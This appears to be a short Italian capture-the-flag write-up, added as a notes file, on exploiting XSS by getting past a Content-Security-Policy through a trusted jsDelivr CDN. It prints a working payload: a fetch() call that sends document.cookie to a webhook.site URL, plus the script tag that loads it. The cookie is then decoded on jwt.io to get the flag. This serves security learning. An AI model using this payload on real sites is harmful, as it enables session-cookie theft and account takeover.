@@ -1,0 +1,20 @@
+C'è "Il team controllerà la richiesta", penso subito a XSS
+In burp nella richiesta vedo che c'è il Content-Security-Policy-Header
+Per controllare c'è CSP evaluator dove posso inserire il codice e controllare le informazioni che mi dice
+
+Sfrutto la vulnerabilità con GitHub, non semplice
+Credo un file in github e con il link 
+https://cdn.jsdelivr.net/gh/StJayy/test/test.js
+Posso accedere, questo file è trustuto dal software
+
+Utilizzo webhook.site per controllare tutte le richieste
+Il file github diventa
+fetch('https://webhook.site/6bb81e32-cd5f-4927-a002-ad916ed9e02d?cookie=' + document.cookie);
+
+È una linea in Js che permette di mandare una richiesta a webhook inviando il cookie, spero di catturarlo
+Lo script finale sarà
+<script src="https://cdn.jsdelivr.net/gh/StJayy/test/weapon.js"></script>
+È arrivata la richiesta in webhook.
+
+Prendo il cookie e lo inserisco in jwt.io
+Ho la flag
